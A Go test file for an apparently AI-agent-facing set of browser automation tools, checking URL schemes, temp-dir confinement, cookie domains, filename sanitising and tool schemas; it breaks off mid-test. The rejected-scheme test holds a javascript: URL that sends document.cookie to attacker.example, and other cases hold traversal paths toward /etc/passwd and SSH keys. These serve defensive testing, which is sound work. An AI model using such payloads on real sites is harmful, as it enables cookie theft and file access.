package tools

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	cdpaccessibility "github.com/chromedp/cdproto/accessibility"
)

// ── validateNavigationURL ────────────────────────────────────────────────────

func TestValidateNavigationURL_AcceptedSchemes(t *testing.T) {
	cases := []string{
		"https://example.com",
		"https://example.com/path?q=1#frag",
		"http://localhost:8080",
		"about:blank",
		"about:srcdoc",
		"  https://example.com  ", // surrounding whitespace tolerated
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if err := validateNavigationURL(in); err != nil {
				t.Errorf("expected accepted, got error: %v", err)
			}
		})
	}
}

func TestValidateNavigationURL_RejectedSchemes(t *testing.T) {
	cases := map[string]string{
		"file":             "file:///etc/passwd",
		"chrome":           "chrome://settings",
		"chrome-extension": "chrome-extension://abcd/popup.html",
		"javascript":       "javascript:fetch('https://attacker.example?c='+document.cookie)",
		"data":             "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		"vscode":           "vscode://settings",
		"mailto":           "mailto:user@example.com",
		"ftp":              "ftp://example.com",
		"ws":               "ws://example.com/socket",
	}
	for name, in := range cases {
		t.Run(name, func(t *testing.T) {
			err := validateNavigationURL(in)
			if err == nil {
				t.Fatalf("expected rejection, got nil error for %q", in)
			}
			if !strings.Contains(err.Error(), "not permitted") {
				t.Errorf("expected error mentioning 'not permitted', got %v", err)
			}
		})
	}
}

func TestValidateNavigationURL_EmptyOrSchemeless(t *testing.T) {
	tests := map[string]string{
		"empty":      "",
		"whitespace": "   ",
		"no-scheme":  "example.com",
	}
	for name, in := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateNavigationURL(in); err == nil {
				t.Fatalf("expected error for %q, got nil", in)
			}
		})
	}
}

// ── confineToTempDir ────────────────────────────────────────────────────

func TestConfineScreenshotPath_EmptyReturnsEmpty(t *testing.T) {
	got, err := confineToTempDir("")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != "" {
		t.Errorf("expected empty path passthrough, got %q", got)
	}
}

func TestConfineScreenshotPath_RelativeRejected(t *testing.T) {
	cases := []string{
		"relative.png",
		"./screenshot.png",
		"sub/dir/file.png",
		"../escape.png",
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if _, err := confineToTempDir(in); err == nil {
				t.Fatalf("expected rejection of relative path %q", in)
			}
		})
	}
}

func TestConfineScreenshotPath_AcceptsTempDescendants(t *testing.T) {
	tempDir := os.TempDir()
	cases := []string{
		filepath.Join(tempDir, "shot.png"),
		filepath.Join(tempDir, "sub", "shot.png"),
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			got, err := confineToTempDir(in)
			if err != nil {
				t.Fatalf("expected accept, got %v", err)
			}
			if got != filepath.Clean(in) {
				t.Errorf("expected %q, got %q", filepath.Clean(in), got)
			}
		})
	}
}

func TestConfineScreenshotPath_RejectsOutsideTemp(t *testing.T) {
	cases := []string{
		"/etc/passwd",
		"/home/user/.ssh/authorized_keys",
		"/var/log/syslog",
		"/root/secret.png",
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if _, err := confineToTempDir(in); err == nil {
				t.Fatalf("expected rejection of %q (outside temp)", in)
			}
		})
	}
}

func TestConfineScreenshotPath_RejectsTraversalEscapingTemp(t *testing.T) {
	tempDir := os.TempDir()
	// Constructed to land outside temp after Clean: tempDir/../etc/passwd
	traversal := filepath.Join(tempDir, "..", "etc", "passwd")
	if _, err := confineToTempDir(traversal); err == nil {
		t.Fatalf("expected traversal escape to be rejected: %q", traversal)
	}
}

// ── validateCookieDomain ─────────────────────────────────────────────────────

func TestValidateCookieDomain_EmptyAccepted(t *testing.T) {
	// Empty domain means "use the current page's host" — let the browser handle it.
	if err := validateCookieDomain("", "https://example.com/"); err != nil {
		t.Errorf("expected empty domain to be accepted, got %v", err)
	}
}

func TestValidateCookieDomain_ExactHostMatches(t *testing.T) {
	if err := validateCookieDomain("example.com", "https://example.com/"); err != nil {
		t.Errorf("expected exact host match, got %v", err)
	}
}

func TestValidateCookieDomain_CaseInsensitive(t *testing.T) {
	if err := validateCookieDomain("EXAMPLE.com", "https://example.COM/path"); err != nil {
		t.Errorf("expected case-insensitive match, got %v", err)
	}
}

func TestValidateCookieDomain_LeadingDotStripped(t *testing.T) {
	// `domain=.example.com` is the legacy syntax; equivalent to `domain=example.com`.
	if err := validateCookieDomain(".example.com", "https://example.com/"); err != nil {
		t.Errorf("expected leading-dot equivalence, got %v", err)
	}
	if err := validateCookieDomain(".example.com", "https://api.example.com/"); err != nil {
		t.Errorf("expected leading-dot subdomain, got %v", err)
	}
}

func TestValidateCookieDomain_SubdomainAccepted(t *testing.T) {
	// A page on api.example.com may set a cookie scoped to example.com (parent).
	if err := validateCookieDomain("example.com", "https://api.example.com/"); err != nil {
		t.Errorf("expected subdomain to be allowed for parent cookie, got %v", err)
	}
}

func TestValidateCookieDomain_UnrelatedRejected(t *testing.T) {
	// An attacker page must not be able to set cookies for a different origin.
	cases := map[string]struct{ domain, currentURL string }{
		"unrelated":     {"google.com", "https://attacker.example/"},
		"sibling":       {"other.example.com", "https://api.example.com/"},
		"superstring":   {"example.com.attacker.example", "https://example.com/"},
		"reverse-match": {"sub.api.example.com", "https://api.example.com/"}, // child of current page is NOT allowed (only parents)
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			err := validateCookieDomain(c.domain, c.currentURL)
			if err == nil {
				t.Fatalf("expected rejection: domain=%q url=%q", c.domain, c.currentURL)
			}
			if !strings.Contains(err.Error(), "does not match") {
				t.Errorf("expected 'does not match' in error, got %v", err)
			}
		})
	}
}

func TestValidateCookieDomain_NoHostInCurrentURL(t *testing.T) {
	cases := []string{
		"about:blank",
		"chrome://settings",
		"file:///tmp/foo.html",
	}
	for _, u := range cases {
		t.Run(u, func(t *testing.T) {
			if err := validateCookieDomain("example.com", u); err == nil {
				t.Errorf("expected rejection when current URL has no host: %q", u)
			}
		})
	}
}

func TestValidateCookieDomain_DotOnlyRejected(t *testing.T) {
	// `domain=.` strips to empty — a malformed input that should not silently
	// match every host.
	if err := validateCookieDomain(".", "https://example.com/"); err == nil {
		t.Error("expected rejection of bare-dot domain")
	}
}

// ── lookupNamedKey ───────────────────────────────────────────────────────────

func TestLookupNamedKey_KnownKeysAndAliases(t *testing.T) {
	cases := map[string]string{
		"Enter":      "Enter",
		"enter":      "Enter",
		"  ENTER  ":  "Enter",
		"Return":     "Enter",
		"Esc":        "Escape",
		"escape":     "Escape",
		"Tab":        "Tab",
		"Backspace":  "Backspace",
		"Delete":     "Delete",
		"Space":      " ",
		"ArrowUp":    "ArrowUp",
		"up":         "ArrowUp",
		"ArrowDown":  "ArrowDown",
		"DOWN":       "ArrowDown",
		"ArrowLeft":  "ArrowLeft",
		"left":       "ArrowLeft",
		"ArrowRight": "ArrowRight",
		"right":      "ArrowRight",
		"Home":       "Home",
		"End":        "End",
		"PageUp":     "PageUp",
		"PageDown":   "PageDown",
	}
	for in, wantKey := range cases {
		t.Run(in, func(t *testing.T) {
			nk, ok := lookupNamedKey(in)
			if !ok {
				t.Fatalf("expected lookupNamedKey(%q) to succeed", in)
			}
			if nk.Key != wantKey {
				t.Errorf("Key: got %q, want %q", nk.Key, wantKey)
			}
		})
	}
}

func TestLookupNamedKey_UnknownReturnsFalse(t *testing.T) {
	cases := []string{"a", "Q", "F1", "Shift", "Control", "Meta", "", "  "}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if _, ok := lookupNamedKey(in); ok {
				t.Errorf("expected unknown key %q to return false, got true", in)
			}
		})
	}
}

func TestLookupNamedKey_ArrowKeysHaveVKeys(t *testing.T) {
	// The whole point of replacing the old keyChar() helper is that arrow
	// keys must dispatch real keyboard events. A zero VKey would mean the
	// new path silently degrades to the old broken behaviour.
	for _, name := range []string{"ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"} {
		t.Run(name, func(t *testing.T) {
			nk, ok := lookupNamedKey(name)
			if !ok {
				t.Fatalf("lookupNamedKey(%q) failed", name)
			}
			if nk.WindowsVirtualKeyCode == 0 {
				t.Errorf("%s has WindowsVirtualKeyCode=0; JS keyCode listeners will see 0 as 'no key'", name)
			}
			if nk.Code != name {
				t.Errorf("%s Code: got %q, want %q", name, nk.Code, name)
			}
			if nk.Text != "" {
				t.Errorf("%s should not have Text (it's non-printable), got %q", name, nk.Text)
			}
		})
	}
}

func TestLookupNamedKey_PrintableKeysHaveText(t *testing.T) {
	// Enter, Tab, and Space have ASCII representations and should carry Text
	// so that input fields that listen to "input"/"keypress" events also
	// receive the character.
	cases := map[string]string{
		"Enter": "\r",
		"Tab":   "\t",
		"Space": " ",
	}
	for name, wantText := range cases {
		t.Run(name, func(t *testing.T) {
			nk, ok := lookupNamedKey(name)
			if !ok {
				t.Fatalf("lookupNamedKey(%q) failed", name)
			}
			if nk.Text != wantText {
				t.Errorf("Text: got %q, want %q", nk.Text, wantText)
			}
		})
	}
}

// ── xpathEscapeText edge cases ───────────────────────────────────────────────

func TestXpathEscapeText_NoQuotes(t *testing.T) {
	got := xpathEscapeText("Login")
	if got != "'Login'" {
		t.Errorf("got %q, want %q", got, "'Login'")
	}
}

func TestXpathEscapeText_OnlySingleQuote(t *testing.T) {
	// Falls into the "wrap in double quotes" branch.
	got := xpathEscapeText(`it's`)
	if got != `"it's"` {
		t.Errorf("got %q, want %q", got, `"it's"`)
	}
}

func TestXpathEscapeText_OnlyDoubleQuote(t *testing.T) {
	got := xpathEscapeText(`say "hi"`)
	if got != `'say "hi"'` {
		t.Errorf("got %q, want %q", got, `'say "hi"'`)
	}
}

func TestXpathEscapeText_BothQuotes_UsesConcat(t *testing.T) {
	// Must produce a syntactically valid concat() form.
	got := xpathEscapeText(`it's "fun"`)
	// The exact form is implementation detail; what matters is that it
	// starts with concat( and is a balanced expression with no empty
	// arguments (concat() with zero args is a parse error).
	if !strings.HasPrefix(got, "concat(") || !strings.HasSuffix(got, ")") {
		t.Fatalf("expected concat(...) form, got %q", got)
	}
	if strings.Contains(got, "concat()") {
		t.Errorf("concat() with no arguments is invalid XPath: %q", got)
	}
	if strings.Contains(got, ",,") {
		t.Errorf("empty argument inside concat is invalid XPath: %q", got)
	}
}

func TestXpathEscapeText_Empty(t *testing.T) {
	// Defensive: empty input should still produce a valid XPath string
	// expression rather than something that breaks downstream interpolation.
	got := xpathEscapeText("")
	if got != "''" {
		t.Errorf("got %q, want %q", got, "''")
	}
}

// ── browser_screenshot validation ────────────────────────────────────────────
//
// The format/quality validation paths run before any CDP call, so we can
// exercise them by invoking the tool's Run directly with no real browser.

func findBrowserTool(t *testing.T, name string) Tool {
	t.Helper()
	for _, tool := range NewBrowserTools(nil, 0) {
		if tool.GetName() == name {
			return tool
		}
	}
	t.Fatalf("tool %q not registered in NewBrowserTools", name)
	return nil
}

func TestBrowserScreenshot_RejectsUnknownFormat(t *testing.T) {
	tool := findBrowserTool(t, "browser_screenshot")
	res := tool.Run(map[string]any{"format": "webp"})
	if res.GetError() == nil {
		t.Fatal("expected error for unknown format")
	}
	if !strings.Contains(res.GetError().Error(), "format must be") {
		t.Errorf("expected format-validation error, got %v", res.GetError())
	}
}

func TestBrowserScreenshot_RejectsOutOfRangeQuality(t *testing.T) {
	tool := findBrowserTool(t, "browser_screenshot")
	cases := []int{0, -5, 101, 200}
	for _, q := range cases {
		t.Run(fmt.Sprintf("q=%d", q), func(t *testing.T) {
			res := tool.Run(map[string]any{"format": "jpeg", "quality": q})
			if res.GetError() == nil {
				t.Fatalf("expected error for quality=%d", q)
			}
			if !strings.Contains(res.GetError().Error(), "quality must be") {
				t.Errorf("expected quality-range error, got %v", res.GetError())
			}
		})
	}
}

// ── browser_upload_file validation ───────────────────────────────────────────

func TestBrowserUploadFile_RequiresSelector(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	res := tool.Run(map[string]any{"files": []any{"/tmp/x"}})
	if res.GetError() == nil {
		t.Fatal("expected error when selector is missing")
	}
	if !strings.Contains(res.GetError().Error(), "'selector' is required") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_RequiresFilesArray(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	cases := map[string]any{
		"missing":     map[string]any{"selector": "#x"},
		"empty-array": map[string]any{"selector": "#x", "files": []any{}},
		"wrong-type":  map[string]any{"selector": "#x", "files": "not-an-array"},
		"non-string":  map[string]any{"selector": "#x", "files": []any{42}},
	}
	for name, params := range cases {
		t.Run(name, func(t *testing.T) {
			p := params.(map[string]any)
			res := tool.Run(p)
			if res.GetError() == nil {
				t.Fatalf("expected error for %s, got success: %v", name, res.GetContent())
			}
		})
	}
}

func TestBrowserUploadFile_RejectsRelativePath(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	res := tool.Run(map[string]any{
		"selector": "#upload",
		"files":    []any{"relative/path.txt"},
	})
	if res.GetError() == nil {
		t.Fatal("expected error for relative path")
	}
	if !strings.Contains(res.GetError().Error(), "absolute path") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_RejectsMissingFile(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	res := tool.Run(map[string]any{
		"selector": "#upload",
		"files":    []any{"/nonexistent/path/file.txt"},
	})
	if res.GetError() == nil {
		t.Fatal("expected error for missing file")
	}
	if !strings.Contains(res.GetError().Error(), "cannot be read") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_RejectsDirectory(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	dir := t.TempDir()
	res := tool.Run(map[string]any{
		"selector": "#upload",
		"files":    []any{dir},
	})
	if res.GetError() == nil {
		t.Fatal("expected error when path is a directory")
	}
	if !strings.Contains(res.GetError().Error(), "is a directory") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_AcceptsExistingAbsolutePath(t *testing.T) {
	// Validation must succeed (we don't actually do the upload because that
	// would need a real browser; but every check before the CDP round-trip
	// should pass cleanly).
	dir := t.TempDir()
	path := filepath.Join(dir, "upload.txt")
	if err := os.WriteFile(path, []byte("hello"), 0o600); err != nil {
		t.Fatalf("seed file: %v", err)
	}
	// We can't easily assert the success path here without a browser, but we
	// can assert that validation is fine and the failure (if any) comes from
	// the CDP-pool layer, not from path validation.
	_, err := stringSliceParam(map[string]any{"files": []any{path}}, "files")
	if err != nil {
		t.Fatalf("stringSliceParam should accept []any{string}: %v", err)
	}
}

// ── stringSliceParam ─────────────────────────────────────────────────────────

func TestStringSliceParam_AcceptsBothShapes(t *testing.T) {
	// Both []string and []any-of-strings are valid; the upstream decoder
	// can produce either depending on the JSON path.
	asString, err := stringSliceParam(map[string]any{"x": []string{"a", "b"}}, "x")
	if err != nil {
		t.Errorf("[]string: %v", err)
	} else if len(asString) != 2 || asString[0] != "a" || asString[1] != "b" {
		t.Errorf("[]string: got %v", asString)
	}

	asAny, err := stringSliceParam(map[string]any{"x": []any{"a", "b"}}, "x")
	if err != nil {
		t.Errorf("[]any: %v", err)
	} else if len(asAny) != 2 || asAny[0] != "a" || asAny[1] != "b" {
		t.Errorf("[]any: got %v", asAny)
	}
}

func TestStringSliceParam_RejectsNonStringItem(t *testing.T) {
	_, err := stringSliceParam(map[string]any{"x": []any{"ok", 42}}, "x")
	if err == nil {
		t.Fatal("expected error for non-string item")
	}
	if !strings.Contains(err.Error(), "want string") {
		t.Errorf("got %v", err)
	}
}

func TestStringSliceParam_RejectsWrongType(t *testing.T) {
	_, err := stringSliceParam(map[string]any{"x": "scalar"}, "x")
	if err == nil {
		t.Fatal("expected error for non-array")
	}
	if !strings.Contains(err.Error(), "must be an array") {
		t.Errorf("got %v", err)
	}
}

func TestStringSliceParam_RejectsMissingKey(t *testing.T) {
	_, err := stringSliceParam(map[string]any{}, "x")
	if err == nil {
		t.Fatal("expected error when key absent")
	}
}

// ── browser_download_file validation ─────────────────────────────────────────

func TestBrowserDownloadFile_RequiresSelector(t *testing.T) {
	tool := findBrowserTool(t, "browser_download_file")
	res := tool.Run(map[string]any{})
	if res.GetError() == nil {
		t.Fatal("expected error when selector is missing")
	}
	if !strings.Contains(res.GetError().Error(), "'selector' is required") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserDownloadFile_RejectsTimeoutTooSmall(t *testing.T) {
	tool := findBrowserTool(t, "browser_download_file")
	res := tool.Run(map[string]any{
		"selector":   "#download",
		"timeout_ms": 500,
	})
	if res.GetError() == nil {
		t.Fatal("expected error for timeout_ms below minimum")
	}
	if !strings.Contains(res.GetError().Error(), "timeout_ms must be at least") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserDownloadFile_RejectsSavePathOutsideTemp(t *testing.T) {
	tool := findBrowserTool(t, "browser_download_file")
	res := tool.Run(map[string]any{
		"selector":  "#download",
		"save_path": "/etc/passwd",
	})
	if res.GetError() == nil {
		t.Fatal("expected error for save_path outside temp dir")
	}
	if !strings.Contains(res.GetError().Error(), "must be inside") {
		t.Errorf("got %v", res.GetError())
	}
}

// ── sanitizeFilename ─────────────────────────────────────────────────────────

func TestSanitizeFilename_StripsPathTraversal(t *testing.T) {
	cases := map[string]string{
		// Linux / Unix path traversal — Base() always returns the last segment.
		"../etc/passwd":           "passwd",
		"/etc/passwd":             "passwd",
		"../../home/user/.ssh/id": "id",
		"foo/bar/baz.txt":         "baz.txt",
		// Windows path traversal — Chrome may emit either separator.
		`..\Windows\System32\foo`: "foo",
		`C:\secret.txt`:           "secret.txt",
	}
	for in, want := range cases {
		t.Run(in, func(t *testing.T) {
			got := sanitizeFilename(in)
			if got != want {
				t.Errorf("got %q, want %q", got, want)
			}
		})
	}
}

func TestSanitizeFilename_StripsLeadingDots(t *testing.T) {
	// `..report.csv` would become hidden / malformed; we strip the dots.
	got := sanitizeFilename("..report.csv")
	if got != "report.csv" {
		t.Errorf("got %q, want %q", got, "report.csv")
	}
	// Normal filenames are unaffected.
	if got := sanitizeFilename("data.csv"); got != "data.csv" {
		t.Errorf("got %q, want %q", got, "data.csv")
	}
}

func TestSanitizeFilename_DropsReservedChars(t *testing.T) {
	// Windows-reserved characters and null bytes are dropped.
	got := sanitizeFilename("re:p<o>r|t?\x00.csv")
	if got != "report.csv" {
		t.Errorf("got %q, want %q", got, "report.csv")
	}
}

func TestSanitizeFilename_AllUnsafeReturnsEmpty(t *testing.T) {
	cases := []string{
		"...",      // all dots
		"//",       // all separators
		":<>?\x00", // all reserved chars
		"",         // already empty
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if got := sanitizeFilename(in); got != "" {
				t.Errorf("expected empty for %q, got %q", in, got)
			}
		})
	}
}

func TestSanitizeFilename_PreservesUnicode(t *testing.T) {
	// Non-ASCII characters are valid in filenames and must pass through.
	in := "ファイル.csv"
	if got := sanitizeFilename(in); got != in {
		t.Errorf("got %q, want %q", got, in)
	}
}

// ── resolveFrame ─────────────────────────────────────────────────────────────
//
// The non-empty frameSelector path needs a live CDP context (DescribeNode on a
// real iframe in a real document); we don't unit-test that here. The empty
// path returns the trivial chromedp.ByQuery option synchronously without any
// CDP traffic, which we can verify directly.

func TestResolveFrame_EmptyReturnsTopFrameOpts(t *testing.T) {
	opts, err := resolveFrame(context.Background(), "")
	if err != nil {
		t.Fatalf("unexpected error for empty frame: %v", err)
	}
	if len(opts) == 0 {
		t.Fatal("expected at least one query option for the top frame")
	}
}

// ── frame parameter wiring ───────────────────────────────────────────────────
//
// Verify every tool that should accept a `frame` parameter actually advertises
// it in its schema. Catches the silent-drop case where someone adds a new
// tool, forgets to plumb iframe support, and the agent silently runs every
// query in the top frame.

func TestBrowserTools_FrameParameterPresence(t *testing.T) {
	expectFrame := map[string]bool{
		"browser_click":         true,
		"browser_type":          true,
		"browser_fill":          true,
		"browser_select":        true,
		"browser_key":           true,
		"browser_hover":         true,
		"browser_screenshot":    true,
		"browser_get_text":      true,
		"browser_get_html":      true,
		"browser_wait":          true,
		"browser_scroll":        true,
		"browser_upload_file":   true,
		"browser_download_file": true,
		"browser_eval":          true,
	}

	for _, tool := range NewBrowserTools(nil, 0) {
		want := expectFrame[tool.GetName()]
		if !want {
			continue
		}
		t.Run(tool.GetName(), func(t *testing.T) {
			schema := tool.GetParameters()
			props, _ := schema["properties"].(map[string]any)
			if _, ok := props["frame"]; !ok {
				t.Errorf("%s: schema missing `frame` property — iframe scoping is not wired up", tool.GetName())
			}
		})
	}
}

// ── hoverAbsPosJS / hoverEventsJS ────────────────────────────────────────────

func TestHoverAbsPosJS_TopFrame(t *testing.T) {
	js := hoverAbsPosJS("", "#btn")
	if !strings.Contains(js, `document.querySelector("#btn")`) {
		t.Errorf("top-frame: expected top-doc querySelector, got: %s", js)
	}
	if strings.Contains(js, "contentDocument") {
		t.Errorf("top-frame: must not reference contentDocument, got: %s", js)
	}
}

func TestHoverAbsPosJS_IframeTranslatesCoords(t *testing.T) {
	js := hoverAbsPosJS("#myframe", "#btn")
	if !strings.Contains(js, `document.querySelector("#myframe")`) {
		t.Errorf("iframe: expected outer querySelector for frame, got: %s", js)
	}
	if !strings.Contains(js, "contentDocument") {
		t.Errorf("iframe: expected contentDocument access, got: %s", js)
	}
	if !strings.Contains(js, "fr.left+er.left") {
		t.Errorf("iframe: expected coordinate translation fr.left+er.left, got: %s", js)
	}
}

func TestHoverEventsJS_TopFrameUsesDocumentMouseEvent(t *testing.T) {
	js := hoverEventsJS("", "#btn")
	if !strings.Contains(js, "new MouseEvent") {
		t.Errorf("top-frame: expected new MouseEvent, got: %s", js)
	}
	if strings.Contains(js, "__win") {
		t.Errorf("top-frame: must not use iframe contentWindow, got: %s", js)
	}
}

func TestHoverEventsJS_IframeUsesContentWindowRealm(t *testing.T) {
	js := hoverEventsJS("#myframe", "#btn")
	if !strings.Contains(js, "__win.MouseEvent") {
		t.Errorf("iframe: expected events via iframe contentWindow.MouseEvent, got: %s", js)
	}
	if !strings.Contains(js, "contentDocument") {
		t.Errorf("iframe: expected contentDocument for element lookup, got: %s", js)
	}
}

// ── browser_dialog schema ────────────────────────────────────────────────────

func TestBrowserDialogTool_Schema(t *testing.T) {
	tool := findBrowserTool(t, "browser_dialog")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)
	for _, field := range []string{"action", "text", "wait_ms"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_dialog: schema missing %q property", field)
		}
	}
	if ap, _ := schema["additionalProperties"].(bool); ap {
		t.Error("browser_dialog: additionalProperties should be false, not true")
	}
	actionProp, _ := props["action"].(map[string]any)
	enums, _ := actionProp["enum"].([]string)
	if len(enums) != 2 {
		t.Errorf("browser_dialog: action enum should have 2 values (accept/dismiss), got %v", enums)
	}
	req, _ := schema["required"].([]string)
	found := false
	for _, r := range req {
		if r == "action" {
			found = true
		}
	}
	if !found {
		t.Error("browser_dialog: 'action' should be required")
	}
}

// ── browser_storage schema ───────────────────────────────────────────────────

func TestBrowserStorageTool_Schema(t *testing.T) {
	tool := findBrowserTool(t, "browser_storage")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	for _, field := range []string{"action", "storage", "key", "value"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_storage: schema missing %q property", field)
		}
	}

	actionProp, _ := props["action"].(map[string]any)
	enums, _ := actionProp["enum"].([]string)
	wantActions := map[string]bool{"get": true, "set": true, "remove": true, "clear": true, "get_all": true}
	for _, e := range enums {
		delete(wantActions, e)
	}
	if len(wantActions) > 0 {
		t.Errorf("browser_storage: action enum missing values: %v", wantActions)
	}

	storageProp, _ := props["storage"].(map[string]any)
	storageEnums, _ := storageProp["enum"].([]string)
	if len(storageEnums) != 2 {
		t.Errorf("browser_storage: storage enum should have 2 values (local/session), got %v", storageEnums)
	}

	req, _ := schema["required"].([]string)
	foundAction := false
	for _, r := range req {
		if r == "action" {
			foundAction = true
		}
	}
	if !foundAction {
		t.Error("browser_storage: 'action' must be required")
	}
}

// ── browser_delete_cookies schema ────────────────────────────────────────────

func TestBrowserDeleteCookiesTool_Schema(t *testing.T) {
	tool := findBrowserTool(t, "browser_delete_cookies")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	for _, field := range []string{"name", "domain"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_delete_cookies: schema missing %q property", field)
		}
	}

	req, _ := schema["required"].([]string)
	foundName := false
	for _, r := range req {
		if r == "name" {
			foundName = true
		}
	}
	if !foundName {
		t.Error("browser_delete_cookies: 'name' must be required")
	}

	if ap, _ := schema["additionalProperties"].(bool); ap {
		t.Error("browser_delete_cookies: additionalProperties should be false")
	}
}

// ── browser_wait network_idle schema ────────────────────────────────────────

func TestBrowserWaitTool_NetworkIdleSchema(t *testing.T) {
	tool := findBrowserTool(t, "browser_wait")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	// selector must exist but must NOT be in required (network_idle needs no selector)
	if _, ok := props["selector"]; !ok {
		t.Error("browser_wait: schema missing 'selector' property")
	}
	req, _ := schema["required"].([]string)
	for _, r := range req {
		if r == "selector" {
			t.Error("browser_wait: 'selector' must not be required — network_idle state needs no selector")
		}
	}

	// quiet_ms must be present
	if _, ok := props["quiet_ms"]; !ok {
		t.Error("browser_wait: schema missing 'quiet_ms' property")
	}

	// state enum must include network_idle
	stateProp, _ := props["state"].(map[string]any)
	enums, _ := stateProp["enum"].([]string)
	found := false
	for _, e := range enums {
		if e == "network_idle" {
			found = true
		}
	}
	if !found {
		t.Errorf("browser_wait: state enum missing 'network_idle', got: %v", enums)
	}
}

// ── browser_set_viewport schema ──────────────────────────────────────────────

func TestBrowserSetViewportTool_Schema(t *testing.T) {
	tool := findBrowserTool(t, "browser_set_viewport")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	for _, field := range []string{"width", "height", "device_scale_factor", "mobile", "reset"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_set_viewport: schema missing %q property", field)
		}
	}

	// width and height must NOT be required at schema level (reset=true bypasses them)
	req, _ := schema["required"].([]string)
	for _, r := range req {
		if r == "width" || r == "height" {
			t.Errorf("browser_set_viewport: %q must not be schema-required (reset mode needs no dimensions)", r)
		}
	}

	if ap, _ := schema["additionalProperties"].(bool); ap {
		t.Error("browser_set_viewport: additionalProperties should be false")
	}
}

// ── browser_drag schema ───────────────────────────────────────────────────────

func TestBrowserDragTool_Schema(t *testing.T) {
	tool := findBrowserTool(t, "browser_drag")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	for _, field := range []string{"source", "target", "steps"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_drag: schema missing %q property", field)
		}
	}

	req, _ := schema["required"].([]string)
	reqSet := make(map[string]bool, len(req))
	for _, r := range req {
		reqSet[r] = true
	}
	if !reqSet["source"] {
		t.Error("browser_drag: 'source' must be required")
	}
	if !reqSet["target"] {
		t.Error("browser_drag: 'target' must be required")
	}
	if reqSet["steps"] {
		t.Error("browser_drag: 'steps' must NOT be required (it has a default)")
	}

	stepsProp, _ := props["steps"].(map[string]any)
	if stepsProp["type"] != "integer" {
		t.Errorf("browser_drag: steps should be integer, got %v", stepsProp["type"])
	}

	if ap, _ := schema["additionalProperties"].(bool); ap {
		t.Error("browser_drag: additionalProperties should be false")
	}
}

// ── browser_select multi-select schema ───────────────────────────────────────

func TestBrowserSelectTool_MultiSelectSchema(t *testing.T) {
	tool := findBrowserTool(t, "browser_select")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	// 'values' array property must exist
	valuesProp, ok := props["values"].(map[string]any)
	if !ok {
		t.Fatal("browser_select: schema missing 'values' array property")
	}
	if valuesProp["type"] != "array" {
		t.Errorf("browser_select: 'values' should be type array, got %v", valuesProp["type"])
	}
	items, _ := valuesProp["items"].(map[string]any)
	if items["type"] != "string" {
		t.Errorf("browser_select: 'values' items should be string, got %v", items["type"])
	}

	// 'value' and 'text' (single-select) must still exist
	for _, field := range []string{"value", "text", "selector", "frame"} {
		if _, ok := props[field]; !ok {
			t.Errorf("browser_select: schema missing backward-compatible %q property", field)
		}
	}
}

// ── browser_eval timeout_ms schema ───────────────────────────────────────────

func TestBrowserEvalTool_TimeoutSchema(t *testing.T) {
	tool := findBrowserTool(t, "browser_eval")
	schema := tool.GetParameters()
	props, _ := schema["properties"].(map[string]any)

	timeoutProp, ok := props["timeout_ms"].(map[string]any)
	if !ok {
		t.Fatal("browser_eval: schema missing 'timeout_ms' property")
	}
	if timeoutProp["type"] != "integer" {
		t.Errorf("browser_eval: timeout_ms should be integer, got %v", timeoutProp["type"])
	}
	if minTimeOut, _ := timeoutProp["minimum"].(int); minTimeOut != 100 {
		t.Errorf("browser_eval: timeout_ms minimum should be 100, got %v", timeoutProp["minimum"])
	}
	if maxTimeOut, _ := timeoutProp["maximum"].(int); maxTimeOut != 25000 {
		t.Errorf("browser_eval: timeout_ms maximum should be 25000, got %v", timeoutProp["maximum"])
	}

	// script must still be required
	req, _ := schema["required"].([]string)
	found := false
	for _, r := range req {
		if r == "script" {
			found = true
		}
	}
	if !found {
		t.Error("browser_eval: 'script' must be required")
	}
}

// ── browser_select anyOf constraint (item 11) ────────────────────────────────

func TestBrowserSelectTool_AnyOfRequiresValueOrTextOrValues(t *testing.T) {
	tool := findBrowserTool(t, "browser_select")
	schema := tool.GetParameters()

	anyOf, ok := schema["anyOf"].([]any)
	if !ok {
		t.Fatal("browser_select: schema missing 'anyOf' constraint")
	}
	if len(anyOf) != 3 {
		t.Fatalf("browser_select: anyOf should have 3 alternatives, got %d", len(anyOf))
	}
	want := map[string]bool{"value": false, "text": false, "values": false}
	for _, alt := range anyOf {
